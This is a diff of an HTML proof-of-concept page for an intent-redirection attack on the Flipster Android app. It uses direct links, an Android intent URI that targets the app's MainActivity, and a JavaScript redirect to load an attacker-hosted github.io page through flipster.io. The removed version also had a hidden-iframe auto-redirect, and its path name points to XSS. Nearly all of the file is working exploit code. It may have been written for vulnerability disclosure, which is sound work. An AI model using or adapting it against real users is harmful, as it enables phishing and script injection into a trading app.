@@ -1,42 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Flipster PoC</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
+<head><title>Flipster PoC</title></head>
 <body>
     <h2>Flipster Intent Redirection PoC</h2>
 
-    <!-- Простая https ссылка — для всех браузеров -->
-    <p><a href="https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/">
-        1. Direct HTTPS link
-    </a></p>
+    <a href="https://flipster.io/https://xaleraf4ra.github.io/test-poc.github.io/">
+        Open via direct link
+    </a>
 
-    <!-- JS redirect через кнопку -->
-    <p><button onclick="tryIntent()">2. Open via Intent</button></p>
+    <br><br>
 
-    <!-- Автоматический редирект -->
-    <p><button onclick="autoOpen()">3. Auto-redirect</button></p>
+    <a href="intent://flipster.io/https://xaleraf4ra.github.io/test-poc.github.io/#Intent;scheme=https;package=com.prestolabs.android.prex;component=com.prestolabs.android.prex/.presentations.ui.MainActivity;action=android.intent.action.VIEW;end">
+        Open via Intent scheme
+    </a>
+
+    <br><br>
+
+    <button onclick="openApp()">Open via JS redirect</button>
 
     <script>
-    function tryIntent() {
-        var w = window.open("https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/", "_blank");
-        if (!w) {
-            window.location.href = "https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/";
-        }
-    }
-
-    function autoOpen() {
-        // Пробуем intent scheme
-        var iframe = document.createElement("iframe");
-        iframe.style.display = "none";
-        iframe.src = "intent://flipster.io/https://xaleraf4ra.github.io/flipsterxss/#Intent;scheme=https;package=com.prestolabs.android.prex;end";
-        document.body.appendChild(iframe);
-
-        // Фоллбэк через 2 секунды — прямой URL
-        setTimeout(function() {
-            window.location.href = "https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/";
-        }, 2000);
+    function openApp() {
+        window.location = "intent://flipster.io/https://xaleraf4ra.github.io/test-poc.github.io/#Intent;scheme=https;package=com.prestolabs.android.prex;component=com.prestolabs.android.prex/.presentations.ui.MainActivity;action=android.intent.action.VIEW;end";
     }
     </script>
 </body>
